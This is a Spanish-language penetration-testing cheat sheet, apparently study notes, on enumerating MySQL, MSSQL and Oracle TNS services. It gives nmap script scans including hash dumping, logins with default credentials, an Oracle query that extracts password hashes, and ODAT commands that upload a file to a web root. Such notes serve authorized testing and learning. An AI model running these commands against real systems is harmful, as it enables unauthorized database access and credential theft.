# Bases de datos (secciones 13–15)

Enumeración de MySQL, MSSQL y Oracle TNS. Reemplaza `$TARGET` por la IP autorizada. Aplica
OODA y verifica manualmente (los NSE de bases de datos dan falsos positivos conocidos).

---

## MySQL — TCP 3306 · Sección 13

**Qué es.** RDBMS open-source de Oracle (cliente-servidor), pilar de LAMP/LEMP; MariaDB es un
fork. Config: `/etc/mysql/mysql.conf.d/mysqld.cnf`. BDs del sistema: `information_schema`,
`mysql`, `performance_schema`, `sys`.

**Ajustes peligrosos:** `user`, `password`, `admin_address` (texto plano), `debug`,
`sql_warnings`, `secure_file_priv`. El NSE `mysql-empty-password` da **falsos positivos**.

```bash
sudo nmap -sV -sC -p3306 --script mysql* $TARGET

# Conexión (sin espacio entre -p y la contraseña)
mysql -u root -h $TARGET
mysql -u robin -probin -h $TARGET

# Dentro de MySQL
#   select version();
#   show databases;
#   use <db>;
#   show tables;
#   show columns from <tabla>;
#   select * from <tabla>;
#   select * from <tabla> where <col> = "<string>";
```

**Documenta:** versión, bases de datos de aplicación y datos sensibles accesibles con las
credenciales descubiertas/reutilizadas.

---

## MSSQL — TCP 1433 (DAC 1434) · Sección 14

**Qué es.** RDBMS de Microsoft, nativo .NET, principalmente Windows. Clientes: SSMS,
`mssql-cli`, `impacket-mssqlclient`. BDs del sistema: `master`, `model`, `msdb`, `tempdb`,
`resource`. Auth por defecto: **Windows Authentication** (SAM local o AD); sin cifrado forzado.

**Ajustes peligrosos:** sin cifrado, certificados self-signed (spoofeables), named pipes,
credenciales débiles, cuenta **`sa`** sin deshabilitar.

```bash
# Nmap con scripts por defecto de MSSQL
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,\
ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes \
--script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER \
-sV -p1433 $TARGET

# Metasploit — ping/descubrimiento
#   use auxiliary/scanner/mssql/mssql_ping

# Impacket mssqlclient (Windows auth)
python3 mssqlclient.py Administrator@$TARGET -windows-auth
#   SQL> select name from sys.databases
```

**Documenta:** versión/instancia, si `sa` está activa, cifrado y bases de datos accesibles.

---

## Oracle TNS — TCP 1521 · Sección 15

**Qué es.** Transparent Network Substrate: comunicación entre la BD Oracle y las apps (con
SSL/TLS). Config: `tnsnames.ora` (cliente) y `listener.ora` (servidor), en
`$ORACLE_HOME/network/admin`. El **SID** (identificador de instancia) es necesario para conectar.

**Defaults clásicos:** Oracle 9 → `CHANGE_ON_INSTALL`; Oracle 10 → sin password; DBSNMP →
`dbsnmp`; credenciales de ejemplo `scott/tiger`.

```bash
sudo nmap -p1521 -sV $TARGET --open
sudo nmap -p1521 -sV $TARGET --open --script oracle-sid-brute

# ODAT (Oracle Database Attacking Tool) — todos los módulos
./odat.py all -s $TARGET

# sqlplus
sqlplus scott/tiger@$TARGET/XE
sqlplus scott/tiger@$TARGET/XE as sysdba
#   select table_name from all_tables;
#   select * from user_role_privs;
#   select name, password from sys.user$;    # extraer hashes

# Subir archivo a web root (utlfile)
echo "test" > testing.txt
./odat.py utlfile -s $TARGET -d XE -U scott -P tiger --sysdba \
  --putFile C:\\\\inetpub\\\\wwwroot testing.txt ./testing.txt
curl -X GET http://$TARGET/testing.txt
```

**Documenta:** SID(s) descubiertos, credenciales por defecto que funcionen, roles/privilegios y
cualquier hash o archivo accesible.

---

## Resumen (secciones 13–15)

| Puerto | Servicio | Credenciales/defaults a probar |
|---|---|---|
| 3306 | MySQL | root sin/clave débil; credenciales reutilizadas |
| 1433 / 1434 | MSSQL | `sa` sin contraseña; Windows auth |
| 1521 | Oracle TNS | `scott/tiger`, `CHANGE_ON_INSTALL`, `dbsnmp/dbsnmp` |
